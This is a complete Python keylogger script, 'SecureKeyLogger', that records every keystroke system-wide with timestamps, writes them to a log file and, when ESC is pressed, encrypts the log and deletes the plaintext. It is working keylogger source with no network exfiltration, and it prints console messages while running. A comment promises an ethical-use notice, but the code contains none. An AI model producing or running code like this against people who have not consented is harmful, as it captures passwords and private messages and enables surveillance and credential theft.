from pynput import keyboard
from cryptography.fernet import Fernet
import os
import time

class SecureKeyLogger:
    def __init__(self, log_file="keylogs.txt", key_file="encryption.key"):
        self.log_file = log_file
        self.key_file = key_file
        self.cipher = self.setup_encryption()
        self.buffer = []

    def setup_encryption(self):
        """Generates or loads the encryption key."""
        if not os.path.exists(self.key_file):
            key = Fernet.generate_key()
            with open(self.key_file, 'wb') as key_file:
                key_file.write(key)
        else:
            with open(self.key_file, 'rb') as key_file:
                key = key_file.read()
        return Fernet(key)

    def get_readable_key(self, key):
        """Converts special keys to readable text."""
        try:
            return key.char or ''
        except AttributeError:
            # Mapping special keys to readable strings
            special_keys = {
                keyboard.Key.space: "[SPACE]",
                keyboard.Key.enter: "[ENTER]",
                keyboard.Key.backspace: "[BACKSPACE]",
                keyboard.Key.shift: "[SHIFT]",
                keyboard.Key.ctrl: "[CTRL]",
                keyboard.Key.alt: "[ALT]",
                keyboard.Key.tab: "[TAB]",
                keyboard.Key.esc: "[ESC]",
            }
            return special_keys.get(key, f"[{key}]")

    def on_key_press(self, key):
        """Callback function to log key presses."""
        readable_key = self.get_readable_key(key)
        timestamp = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime())  # Add timestamp
        log_entry = f"{timestamp} - {readable_key}\n"
        self.buffer.append(log_entry)

        # Stop the keylogger if the ESC key is pressed
        if key == keyboard.Key.esc:
            print("\nESC key pressed. Stopping the keylogger...")
            self.stop_keylogger()

        # Flush buffer to file every 10 keystrokes
        if len(self.buffer) >= 10:
            self.write_to_file()

    def write_to_file(self):
        """Writes buffered keystrokes to the log file."""
        with open(self.log_file, 'a') as log:
            log.writelines(self.buffer)  # Write the entire buffer at once
        self.buffer = []  # Clear the buffer

    def encrypt_log_file(self):
        """Encrypts the log file and deletes the original."""
        with open(self.log_file, 'rb') as file:
            log_data = file.read()
        encrypted_data = self.cipher.encrypt(log_data)
        with open(self.log_file + ".enc", 'wb') as enc_file:
            enc_file.write(encrypted_data)
        os.remove(self.log_file)

    def stop_keylogger(self):
        """Stops the keylogger and encrypts the log file."""
        if self.buffer:
            self.write_to_file()  # Write remaining buffer to file
        self.encrypt_log_file()
        print(f"Logs encrypted and saved as {self.log_file}.enc")

    def start(self):
        """Starts the keylogger."""
        print("Keylogger is running. Press ESC to stop.")

        # Start the listener for key events
        with keyboard.Listener(on_press=self.on_key_press) as listener:
            listener.join()

if __name__ == '__main__':
    # Notify users of the ethical use of the keylogger
    logger = SecureKeyLogger()
    logger.start()

